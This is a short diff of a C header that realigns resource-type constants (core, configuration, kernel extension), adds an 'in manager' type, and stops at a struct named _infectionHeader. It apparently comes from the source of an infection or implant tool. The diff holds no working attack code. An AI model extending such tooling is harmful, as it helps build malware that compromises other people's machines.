@@ -37,9 +37,10 @@
 //
 // Type of resource
 //
-#define RESOURCE_CORE 0x0000
-#define RESOURCE_CONF 0x0001
-#define RESOURCE_KEXT 0x0002
+#define RESOURCE_CORE       0x0000
+#define RESOURCE_CONF       0x0001
+#define RESOURCE_KEXT       0x0002
+#define RESOURCE_IN_MANAGER 0x0003
 
 typedef struct _infectionHeader
 {
